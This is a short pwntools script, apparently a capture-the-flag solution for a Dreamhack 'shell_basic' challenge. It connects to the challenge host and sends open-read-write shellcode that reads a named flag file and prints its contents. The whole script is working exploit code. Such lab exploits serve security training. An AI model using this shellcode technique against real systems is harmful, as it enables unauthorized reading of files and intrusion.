from pwn import *

# p = process('./shell_basic')
p = remote("host1.dreamhack.games", 14713)

context(arch='amd64', os='linux')


flag_name = "/home/shell_basic/flag_name_is_loooooong"

shellcode = ""
shellcode += shellcraft.pushstr(flag_name)
shellcode += shellcraft.open("rsp", 0, 0)
shellcode += shellcraft.read("rax", "rsp", 100)
shellcode += shellcraft.write(1, "rsp", 100)
shellcode += shellcraft.exit(0)
shellcode = asm(shellcode)

p.sendline(shellcode)

p.interactive()
